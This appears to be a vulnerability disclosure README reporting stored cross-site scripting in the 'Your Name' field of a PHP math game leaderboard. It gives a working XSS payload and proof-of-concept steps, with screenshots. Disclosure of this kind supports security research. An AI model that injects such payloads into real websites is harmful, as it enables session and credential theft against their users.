# 2024_Math_Game_XSS

+ **Exploit Title:** Math_Game_Cross_Site_Scripting
+ **Date:** 2024-12-01
+ **Exploit Author:** Burak Sevben
+ **Vendor Homepage:** https://www.sourcecodester.com/php/17075/math-game-leaderboard-using-php-and-mysql-source-code.html
+ **Software Link:** https://www.sourcecodester.com/download-code?nid=17075&title=Math+Game+with+Leaderboard+Using+PHP+and+MySQL+with+Source+Code
+ **Version:** 1.0
+ **Tested on:** Windows 11 Home + PHP 8.2.12, Apache 2.4.58
+ **Payload:** `<video/src=x onerror=alert(document.domain)>`
+ **CVE:** Reported, waiting for CVE number

## Description
The 'Your Name' section in the Submit Score section of the math game app is vulnerable to Cross-Site Scripting Attacks. Math Game is vulnerable to a cross-site scripting vulnerability because it fails to sufficiently sanitize user-supplied data. An attacker may leverage this issue to execute arbitrary script code in the browser of an unsuspecting user in the context of the affected site. This may allow the attacker to steal cookie-based authentication credentials and launch other attacks.

## Proof of Concept:
+ Go to http://localhost/math-game-with-leaderboard/ 
+ Then play the game (it will be over in about 2 minutes).
+ In the 'Your Name' section of the Submit Score section, enter the following payload:  `<video/src=x onerror=alert(document.domain)>`
+ Click Submit and submit your score.
+ A pop-up will then open and XSS will be triggered.

![Ekran görüntüsü 2024-01-11 180814](https://github.com/BurakSevben/2024_Math_Game_XSS/assets/117217689/715b082a-cbe4-4406-ab56-8267f8145872)

![Ekran görüntüsü 2024-01-11 180843](https://github.com/BurakSevben/2024_Math_Game_XSS/assets/117217689/00095e15-d4f4-477f-ac21-e9ebddd2d758)

![Ekran görüntüsü 2024-01-11 180859](https://github.com/BurakSevben/2024_Math_Game_XSS/assets/117217689/6a6335cd-3223-418d-996f-0245b9322dcf)



